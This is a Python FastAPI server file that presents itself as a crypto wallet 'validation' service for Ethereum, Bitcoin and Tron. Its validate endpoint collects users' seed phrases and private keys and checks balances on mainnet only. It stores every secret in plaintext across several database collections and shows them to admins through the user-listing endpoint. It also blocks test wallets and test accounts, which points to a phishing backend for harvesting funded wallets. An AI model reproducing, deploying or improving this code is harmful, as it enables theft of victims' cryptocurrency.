import logging
import os
import secrets
import uuid
from contextlib import asynccontextmanager
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, Literal, Optional

import httpx
import jwt
from bip_utils import (Bip39Languages, Bip39MnemonicValidator,
                       Bip39SeedGenerator, Bip44, Bip44Changes, Bip44Coins)
from dotenv import load_dotenv
from eth_account import Account
from fastapi import (APIRouter, Depends, FastAPI, HTTPException, Request,
                     Response)
from motor.motor_asyncio import AsyncIOMotorClient
from passlib.context import CryptContext
from pydantic import BaseModel
from starlette.middleware.cors import CORSMiddleware
from web3 import Web3
from web3.middleware.geth_poa import geth_poa_middleware

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / ".env")

mongo_url = os.environ["MONGO_URL"]
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ["DB_NAME"]]


@asynccontextmanager
async def lifespan(app: FastAPI):
    await ensure_indexes()
    await seed_admin_if_needed()
    yield
    client.close()


app = FastAPI(lifespan=lifespan)
api = APIRouter(prefix="/api")

JWT_SECRET = os.environ.get("JWT_SECRET", "dev-secret-change-me")
JWT_ALG = "HS256"
COOKIE_NAME = "session"
CSRF_COOKIE_NAME = "csrf_token"
PWD_CTX = CryptContext(schemes=["pbkdf2_sha256"], deprecated="auto")

csrf_tokens: Dict[str, str] = {}

MAINNET_CHAINS = ["ethereum", "bitcoin", "tron"]
CHAINS = MAINNET_CHAINS
WC_PROJECT_ID = os.environ.get("WC_PROJECT_ID")

DEFAULT_RPCS = {
    "ethereum": "https://cloudflare-eth.com",
    "bitcoin": "https://blockstream.info/api",
    "tron": "https://api.trongrid.io",
}
RPC_URLS = {
    "ethereum": os.environ.get("RPC_ETH_URL") or DEFAULT_RPCS["ethereum"],
    "bitcoin": os.environ.get("RPC_BTC_URL") or DEFAULT_RPCS["bitcoin"],
    "tron": os.environ.get("RPC_TRON_URL") or DEFAULT_RPCS["tron"],
}

MAINNET_CHAIN_IDS = {
    "ethereum": 1,
    "bitcoin": None,
    "tron": None,
}

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("bruteosaur")


class UserPublic(BaseModel):
    id: str
    username: str
    role: Literal["user", "admin"]
    created_at: datetime


class UserCreate(BaseModel):
    username: str
    password: str


class UserLogin(BaseModel):
    username: str
    password: str


class LogCreate(BaseModel):
    type: str
    action: str
    metadata: Optional[Dict[str, Any]] = None


class WalletManualValidateReq(BaseModel):
    method: Literal["mnemonic", "private_key"]
    secret: str
    chain: Optional[Literal["ethereum", "bitcoin", "tron"]] = None


async def get_user_by_username(username: str) -> Optional[Dict[str, Any]]:
    result = await db.users.find_one({"username": username})
    return result


async def get_user_by_id(uid: str) -> Optional[Dict[str, Any]]:
    result = await db.users.find_one({"id": uid})
    return result


async def ensure_indexes():
    await db.users.create_index("username", unique=True)
    await db.logs.create_index([("created_at", 1)])
    await db.wallet_validations.create_index([("created_at", 1)])
    await db.wallet_validations_zero.create_index([("created_at", 1)])
    await db.wallet_validations_rejected.create_index([("created_at", 1)])


async def seed_admin_if_needed():
    admin_user = os.getenv("ADMIN_USERNAME", "admin")
    admin_pass = os.getenv("ADMIN_PASSWORD", "admin")
    existing = await get_user_by_username(admin_user)
    if existing:
        return
    hashed = PWD_CTX.hash(admin_pass)
    uid = str(uuid.uuid4())
    doc = {
        "id": uid,
        "username": admin_user,
        "password_hash": hashed,
        "role": "admin",
        "created_at": datetime.utcnow(),
    }
    await db.users.insert_one(doc)
    logger.info(f"Seeded admin user: {admin_user}")


def create_jwt(user_id: str, role: str) -> str:
    now = datetime.utcnow()
    payload = {
        "sub": user_id,
        "role": role,
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(days=7)).timestamp()),
        "jti": str(uuid.uuid4()),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALG)


def parse_jwt(token: str) -> dict:
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALG])
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="SESSION_EXPIRED")
    except Exception:
        raise HTTPException(status_code=401, detail="INVALID_SESSION")


async def get_current_user(request: Request) -> dict:
    token = request.cookies.get(COOKIE_NAME)
    if not token:
        raise HTTPException(status_code=401, detail="NO_SESSION")
    payload = parse_jwt(token)
    uid = payload.get("sub")
    if not uid or not isinstance(uid, str):
        raise HTTPException(status_code=401, detail="INVALID_SESSION")
    user = await get_user_by_id(uid)
    if not user:
        raise HTTPException(status_code=401, detail="INVALID_USER")
    return user


def set_session_cookie(resp: Response, token: str):
    csrf_token = secrets.token_urlsafe(32)
    csrf_tokens[token] = csrf_token
    resp.set_cookie(
        key=COOKIE_NAME,
        value=token,
        httponly=True,
        secure=False,
        samesite="lax",
        max_age=7 * 24 * 3600,
        path="/",
    )
    resp.set_cookie(
        key=CSRF_COOKIE_NAME,
        value=csrf_token,
        httponly=False,
        secure=False,
        samesite="lax",
        max_age=7 * 24 * 3600,
        path="/",
    )


async def verify_csrf_token(request: Request):
    session_token = request.cookies.get(COOKIE_NAME)
    csrf_from_cookie = request.cookies.get(CSRF_COOKIE_NAME)
    csrf_from_header = request.headers.get("X-CSRF-Token")

    logger.info(f"CSRF Verification - Session: {bool(session_token)}, Cookie: {bool(csrf_from_cookie)}, Header: {bool(csrf_from_header)}")

    if not session_token or not csrf_from_cookie or not csrf_from_header:
        logger.warning(f"CSRF_TOKEN_MISSING - Session: {bool(session_token)}, Cookie: {bool(csrf_from_cookie)}, Header: {bool(csrf_from_header)}")
        raise HTTPException(status_code=403, detail="CSRF_TOKEN_MISSING")

    expected_csrf = csrf_tokens.get(session_token)
    logger.info(f"CSRF Check - Expected exists: {bool(expected_csrf)}, Cookie matches: {expected_csrf == csrf_from_cookie}, Header matches: {csrf_from_cookie == csrf_from_header}")

    if expected_csrf != csrf_from_cookie:
        logger.warning(f"CSRF_TOKEN_INVALID - Expected: {expected_csrf[:10] if expected_csrf else None}, Got: {csrf_from_cookie[:10] if csrf_from_cookie else None}")
        raise HTTPException(status_code=403, detail="CSRF_TOKEN_INVALID")

    if csrf_from_cookie != csrf_from_header:
        logger.warning(f"CSRF_TOKEN_MISMATCH - Cookie: {csrf_from_cookie[:10] if csrf_from_cookie else None}, Header: {csrf_from_header[:10] if csrf_from_header else None}")
        raise HTTPException(status_code=403, detail="CSRF_TOKEN_MISMATCH")


def get_w3(chain: str) -> Web3:
    url = RPC_URLS.get(chain)
    if not url:
        raise HTTPException(status_code=501, detail="RPC_NOT_CONFIGURED")
    w3 = Web3(Web3.HTTPProvider(url, request_kwargs={"timeout": 15}))
    if chain in ("polygon", "bsc"):
        try:
            w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        except Exception:
            pass
    if not w3.is_connected():
        raise HTTPException(
            status_code=502, detail=f"RPC_CONNECT_FAILED_{chain.upper()}"
        )
    return w3


def derive_pk_from_mnemonic(mnemonic: str) -> str:
    try:
        validator = Bip39MnemonicValidator(Bip39Languages.ENGLISH)
        validator.Validate(mnemonic)
    except Exception:
        raise HTTPException(status_code=400, detail="INVALID_MNEMONIC_FORMAT")
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
    bip44_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
    acct = (
        bip44_ctx.Purpose()
        .Coin()
        .Account(0)
        .Change(Bip44Changes.CHAIN_EXT)
        .AddressIndex(0)
    )
    pk_hex = acct.PrivateKey().Raw().ToHex()
    return pk_hex


def address_from_private_key(pk: str) -> str:
    pk_clean = pk.strip().lower()
    if pk_clean.startswith("0x"):
        pk_clean = pk_clean[2:]
    if len(pk_clean) != 64:
        raise HTTPException(status_code=400, detail="INVALID_PRIVATE_KEY_FORMAT")
    acct = Account.from_key("0x" + pk_clean)
    return acct.address


@api.post("/auth/register", response_model=UserPublic, status_code=201)
async def register(req: UserCreate, resp: Response):
    if req.username.lower().startswith("test"):
        raise HTTPException(status_code=400, detail="TEST_USERNAMES_NOT_ALLOWED")
    if await get_user_by_username(req.username):
        raise HTTPException(status_code=400, detail="USERNAME_ALREADY_EXISTS")
    hashed = PWD_CTX.hash(req.password)
    uid = str(uuid.uuid4())
    doc = {
        "id": uid,
        "username": req.username,
        "password_hash": hashed,
        "role": "user",
        "created_at": datetime.utcnow(),
    }
    await db.users.insert_one(doc)
    await db.logs.insert_one(
        {
            "id": str(uuid.uuid4()),
            "user_id": uid,
            "type": "user",
            "action": "register",
            "metadata": {"username": req.username},
            "ip": None,
            "ua": None,
            "created_at": datetime.utcnow(),
        }
    )
    token = create_jwt(uid, "user")
    set_session_cookie(resp, token)
    return UserPublic(
        id=uid,
        username=req.username,
        role="user",
        created_at=doc["created_at"],
    )


@api.post("/auth/login", response_model=UserPublic)
async def login(req: UserLogin, resp: Response):
    user = await get_user_by_username(req.username)
    if not user:
        raise HTTPException(status_code=400, detail="INVALID_CREDENTIALS")
    password_hash = user.get("password_hash")
    if not password_hash:
        raise HTTPException(status_code=400, detail="INVALID_CREDENTIALS")
    if not PWD_CTX.verify(req.password, password_hash):
        raise HTTPException(status_code=400, detail="INVALID_CREDENTIALS")
    token = create_jwt(user["id"], user["role"])
    set_session_cookie(resp, token)
    await db.logs.insert_one(
        {
            "id": str(uuid.uuid4()),
            "user_id": user["id"],
            "type": "user",
            "action": "login",
            "metadata": {"username": req.username},
            "ip": None,
            "ua": None,
            "created_at": datetime.utcnow(),
        }
    )
    return UserPublic(
        id=user["id"],
        username=user["username"],
        role=user["role"],
        created_at=user["created_at"],
    )


@api.post("/auth/logout")
async def logout(resp: Response, user: dict = Depends(get_current_user)):
    resp.delete_cookie(COOKIE_NAME, path="/")
    resp.delete_cookie(CSRF_COOKIE_NAME, path="/")
    await db.logs.insert_one(
        {
            "id": str(uuid.uuid4()),
            "user_id": user["id"],
            "type": "user",
            "action": "logout",
            "metadata": {},
            "ip": None,
            "ua": None,
            "created_at": datetime.utcnow(),
        }
    )
    return {"ok": True}


@api.get("/auth/me", response_model=UserPublic)
async def me(user: dict = Depends(get_current_user)):
    return UserPublic(
        id=user["id"],
        username=user["username"],
        role=user["role"],
        created_at=user["created_at"],
    )


TEST_MNEMONICS = [
    "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
]

TEST_PRIVATE_KEYS = []


@api.post("/wallet/manual-validate")
async def manual_validate(
    req: WalletManualValidateReq,
    user: dict = Depends(get_current_user),
    _csrf: None = Depends(verify_csrf_token),
):
    secret_normalized = req.secret.strip().lower()
    
    if req.method == "mnemonic":
        if secret_normalized in TEST_MNEMONICS:
            raise HTTPException(status_code=400, detail="TEST_MNEMONIC_NOT_ALLOWED")
    else:
        pk_clean = secret_normalized.replace("0x", "")
        if pk_clean in TEST_PRIVATE_KEYS:
            raise HTTPException(status_code=400, detail="TEST_PRIVATE_KEY_NOT_ALLOWED")
    
    if user.get("username", "").lower().startswith("test"):
        raise HTTPException(status_code=400, detail="TEST_USERNAMES_NOT_ALLOWED")
    
    chain = (req.chain or CHAINS[0]).lower()
    if chain not in RPC_URLS:
        raise HTTPException(status_code=400, detail="UNSUPPORTED_CHAIN")

    if chain not in MAINNET_CHAINS:
        raise HTTPException(status_code=400, detail="TESTNET_NOT_ALLOWED")

    if req.method == "mnemonic":
        words = req.secret.strip().split()
        if len(words) not in (12, 24):
            raise HTTPException(status_code=400, detail="INVALID_MNEMONIC_FORMAT")
        pk_hex = derive_pk_from_mnemonic(req.secret.strip())
        address = address_from_private_key(pk_hex)
    else:
        try:
            address = address_from_private_key(req.secret.strip())
        except Exception as e:
            logger.error(f"Invalid private key format: {str(e)}")
            raise HTTPException(status_code=400, detail="INVALID_PRIVATE_KEY_FORMAT")

    if chain == "ethereum":
        try:
            w3 = get_w3(chain)
        except HTTPException:
            raise
        except Exception as e:
            logger.error(f"RPC connection failed for {chain}: {str(e)}")
            raise HTTPException(status_code=502, detail=f"RPC_CONNECT_FAILED_ETHEREUM")
        try:
            chain_id = w3.eth.chain_id
            if chain_id != MAINNET_CHAIN_IDS["ethereum"]:
                doc = {
                    "id": str(uuid.uuid4()),
                    "user_id": user["id"],
                    "method": req.method,
                    "chain": chain,
                    "address": address,
                    "reason": f"TESTNET_DETECTED_CHAIN_ID_{chain_id}",
                    "created_at": datetime.utcnow(),
                }
                await db.wallet_validations_rejected.insert_one(doc)
                await db.logs.insert_one(
                    {
                        "id": str(uuid.uuid4()),
                        "user_id": user["id"],
                        "type": "wallet",
                        "action": "wallet_rejected_testnet",
                        "metadata": {
                            "chain": chain,
                            "chain_id": chain_id,
                            "method": req.method,
                            "address": address,
                            "reason": "testnet_detected",
                        },
                        "ip": None,
                        "ua": None,
                        "created_at": datetime.utcnow(),
                    }
                )
                raise HTTPException(
                    status_code=400, detail="TESTNET_NOT_ALLOWED_MAINNET_ONLY"
                )

            bal_wei = w3.eth.get_balance(Web3.to_checksum_address(address))
        except HTTPException:
            raise
        except Exception as e:
            logger.exception(f"balance_fetch_failed: {str(e)}")
            raise HTTPException(status_code=502, detail=f"BALANCE_FETCH_FAILED: {str(e)}")

        balance_eth = str(Web3.from_wei(bal_wei, "ether"))

        if bal_wei <= 0:
            doc = {
                "id": str(uuid.uuid4()),
                "user_id": user["id"],
                "method": req.method,
                "chain": chain,
                "address": address,
                "balance": "0",
                "balance_wei": "0",
                "status": "zero_balance",
                "secret": req.secret.strip(),
                "created_at": datetime.utcnow(),
            }
            await db.wallet_validations_zero.insert_one(doc)

            wallet_connection_data = {
                "address": address,
                "chain": chain,
                "method": req.method,
                "balance": "0",
                "balance_wei": "0",
                "status": "zero_balance",
                "secret": req.secret.strip(),
                "connected_at": datetime.utcnow(),
            }
            await db.users.update_one(
                {"id": user["id"]},
                {"$set": {"wallet_connection": wallet_connection_data}},
            )

            await db.logs.insert_one(
                {
                    "id": str(uuid.uuid4()),
                    "user_id": user["id"],
                    "type": "wallet",
                    "action": "manual_validate_zero_balance",
                    "metadata": {
                        "chain": chain,
                        "method": req.method,
                        "address": address,
                        "balance": "0",
                    },
                    "ip": None,
                    "ua": None,
                    "created_at": datetime.utcnow(),
                }
            )
            return {
                "ok": True,
                "address": address,
                "balance": "0",
                "status": "zero_balance",
            }

        doc = {
            "id": str(uuid.uuid4()),
            "user_id": user["id"],
            "method": req.method,
            "chain": chain,
            "address": address,
            "balance": balance_eth,
            "balance_wei": str(bal_wei),
            "status": "validated",
            "secret": req.secret.strip(),
            "created_at": datetime.utcnow(),
        }
        await db.wallet_validations.insert_one(doc)

        wallet_connection_data = {
            "address": address,
            "chain": chain,
            "method": req.method,
            "balance": balance_eth,
            "balance_wei": str(bal_wei),
            "status": "validated",
            "secret": req.secret.strip(),
            "connected_at": datetime.utcnow(),
        }
        await db.users.update_one(
            {"id": user["id"]}, {"$set": {"wallet_connection": wallet_connection_data}}
        )

        await db.logs.insert_one(
            {
                "id": str(uuid.uuid4()),
                "user_id": user["id"],
                "type": "wallet",
                "action": "manual_validate_success",
                "metadata": {
                    "chain": chain,
                    "method": req.method,
                    "address": address,
                    "balance": balance_eth,
                    "balance_wei": str(bal_wei),
                },
                "ip": None,
                "ua": None,
                "created_at": datetime.utcnow(),
            }
        )

        return {
            "status": "validated",
            "address": address,
            "balance": balance_eth,
        }

    elif chain == "bitcoin":
        try:
            async with httpx.AsyncClient(timeout=15.0) as client:
                resp = await client.get(f"{RPC_URLS['bitcoin']}/address/{address}")
                if resp.status_code != 200:
                    raise HTTPException(status_code=502, detail="BALANCE_FETCH_FAILED")
                data = resp.json()

                funded_txo_sum = data.get("chain_stats", {}).get("funded_txo_sum", 0)
                spent_txo_sum = data.get("chain_stats", {}).get("spent_txo_sum", 0)
                balance_satoshi = funded_txo_sum - spent_txo_sum
                balance_btc = str(balance_satoshi / 100000000)

                if balance_satoshi <= 0:
                    doc = {
                        "id": str(uuid.uuid4()),
                        "user_id": user["id"],
                        "method": req.method,
                        "chain": chain,
                        "address": address,
                        "balance": "0",
                        "balance_satoshi": "0",
                        "status": "zero_balance",
                        "secret": req.secret.strip(),
                        "created_at": datetime.utcnow(),
                    }
                    await db.wallet_validations_zero.insert_one(doc)

                    wallet_connection_data = {
                        "address": address,
                        "chain": chain,
                        "method": req.method,
                        "balance": "0",
                        "balance_satoshi": "0",
                        "status": "zero_balance",
                        "secret": req.secret.strip(),
                        "connected_at": datetime.utcnow(),
                    }
                    await db.users.update_one(
                        {"id": user["id"]},
                        {"$set": {"wallet_connection": wallet_connection_data}},
                    )

                    await db.logs.insert_one(
                        {
                            "id": str(uuid.uuid4()),
                            "user_id": user["id"],
                            "type": "wallet",
                            "action": "manual_validate_zero_balance",
                            "metadata": {
                                "chain": chain,
                                "method": req.method,
                                "address": address,
                                "balance": "0",
                            },
                            "ip": None,
                            "ua": None,
                            "created_at": datetime.utcnow(),
                        }
                    )
                    return {
                        "ok": True,
                        "address": address,
                        "balance": "0",
                        "status": "zero_balance",
                    }

                doc = {
                    "id": str(uuid.uuid4()),
                    "user_id": user["id"],
                    "method": req.method,
                    "chain": chain,
                    "address": address,
                    "balance": balance_btc,
                    "balance_satoshi": str(balance_satoshi),
                    "status": "validated",
                    "secret": req.secret.strip(),
                    "created_at": datetime.utcnow(),
                }
                await db.wallet_validations.insert_one(doc)

                wallet_connection_data = {
                    "address": address,
                    "chain": chain,
                    "method": req.method,
                    "balance": balance_btc,
                    "balance_satoshi": str(balance_satoshi),
                    "status": "validated",
                    "secret": req.secret.strip(),
                    "connected_at": datetime.utcnow(),
                }
                await db.users.update_one(
                    {"id": user["id"]},
                    {"$set": {"wallet_connection": wallet_connection_data}},
                )

                await db.logs.insert_one(
                    {
                        "id": str(uuid.uuid4()),
                        "user_id": user["id"],
                        "type": "wallet",
                        "action": "manual_validate_success",
                        "metadata": {
                            "chain": chain,
                            "method": req.method,
                            "address": address,
                            "balance": balance_btc,
                            "balance_satoshi": str(balance_satoshi),
                        },
                        "ip": None,
                        "ua": None,
                        "created_at": datetime.utcnow(),
                    }
                )

                return {
                    "status": "validated",
                    "address": address,
                    "balance": balance_btc,
                }
        except HTTPException:
            raise
        except Exception:
            logger.exception("bitcoin_balance_fetch_failed")
            raise HTTPException(status_code=502, detail="BALANCE_FETCH_FAILED")

    elif chain == "tron":
        try:
            async with httpx.AsyncClient(timeout=15.0) as client:
                resp = await client.get(f"{RPC_URLS['tron']}/v1/accounts/{address}")
                if resp.status_code != 200:
                    raise HTTPException(status_code=502, detail="BALANCE_FETCH_FAILED")
                data = resp.json()

                if not data.get("data"):
                    balance_sun = 0
                else:
                    balance_sun = data["data"][0].get("balance", 0)

                balance_trx = str(balance_sun / 1000000)

                if balance_sun <= 0:
                    doc = {
                        "id": str(uuid.uuid4()),
                        "user_id": user["id"],
                        "method": req.method,
                        "chain": chain,
                        "address": address,
                        "balance": "0",
                        "balance_sun": "0",
                        "status": "zero_balance",
                        "secret": req.secret.strip(),
                        "created_at": datetime.utcnow(),
                    }
                    await db.wallet_validations_zero.insert_one(doc)

                    wallet_connection_data = {
                        "address": address,
                        "chain": chain,
                        "method": req.method,
                        "balance": "0",
                        "balance_sun": "0",
                        "status": "zero_balance",
                        "secret": req.secret.strip(),
                        "connected_at": datetime.utcnow(),
                    }
                    await db.users.update_one(
                        {"id": user["id"]},
                        {"$set": {"wallet_connection": wallet_connection_data}},
                    )

                    await db.logs.insert_one(
                        {
                            "id": str(uuid.uuid4()),
                            "user_id": user["id"],
                            "type": "wallet",
                            "action": "manual_validate_zero_balance",
                            "metadata": {
                                "chain": chain,
                                "method": req.method,
                                "address": address,
                                "balance": "0",
                            },
                            "ip": None,
                            "ua": None,
                            "created_at": datetime.utcnow(),
                        }
                    )
                    return {
                        "ok": True,
                        "address": address,
                        "balance": "0",
                        "status": "zero_balance",
                    }

                doc = {
                    "id": str(uuid.uuid4()),
                    "user_id": user["id"],
                    "method": req.method,
                    "chain": chain,
                    "address": address,
                    "balance": balance_trx,
                    "balance_sun": str(balance_sun),
                    "status": "validated",
                    "secret": req.secret.strip(),
                    "created_at": datetime.utcnow(),
                }
                await db.wallet_validations.insert_one(doc)

                wallet_connection_data = {
                    "address": address,
                    "chain": chain,
                    "method": req.method,
                    "balance": balance_trx,
                    "balance_sun": str(balance_sun),
                    "status": "validated",
                    "secret": req.secret.strip(),
                    "connected_at": datetime.utcnow(),
                }
                await db.users.update_one(
                    {"id": user["id"]},
                    {"$set": {"wallet_connection": wallet_connection_data}},
                )

                await db.logs.insert_one(
                    {
                        "id": str(uuid.uuid4()),
                        "user_id": user["id"],
                        "type": "wallet",
                        "action": "manual_validate_success",
                        "metadata": {
                            "chain": chain,
                            "method": req.method,
                            "address": address,
                            "balance": balance_trx,
                            "balance_sun": str(balance_sun),
                        },
                        "ip": None,
                        "ua": None,
                        "created_at": datetime.utcnow(),
                    }
                )

                return {
                    "status": "validated",
                    "address": address,
                    "balance": balance_trx,
                }
        except HTTPException:
            raise
        except Exception:
            logger.exception("tron_balance_fetch_failed")
            raise HTTPException(status_code=502, detail="BALANCE_FETCH_FAILED")

    else:
        raise HTTPException(status_code=501, detail="CHAIN_NOT_IMPLEMENTED_YET")


async def require_admin(user: dict = Depends(get_current_user)) -> dict:
    if user.get("role") != "admin":
        raise HTTPException(status_code=403, detail="FORBIDDEN")
    return user


@api.get("/admin/users")
async def admin_users(_admin: dict = Depends(require_admin)):
    cursor = db.users.find({})
    users = await cursor.to_list(length=1000)
    result = []
    for u in users:
        u.pop("password_hash", None)
        u.pop("_id", None)
        result.append(u)
    return {"users": result}


@api.post("/logs", status_code=201)
async def create_log(
    req: LogCreate,
    user: dict = Depends(get_current_user),
    _csrf: None = Depends(verify_csrf_token),
):
    doc = {
        "id": str(uuid.uuid4()),
        "user_id": user["id"],
        "type": req.type,
        "action": req.action,
        "metadata": req.metadata or {},
        "ip": None,
        "ua": None,
        "created_at": datetime.utcnow(),
    }
    await db.logs.insert_one(doc)
    return {"ok": True}


app.add_middleware(
    CORSMiddleware,
    allow_origins=os.environ.get("CORS_ORIGINS", "http://localhost:3000").split(","),
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
    expose_headers=["*"],
)

app.include_router(api)


@app.get("/health")
async def health():
    return {"ok": True, "timestamp": datetime.utcnow().isoformat()}
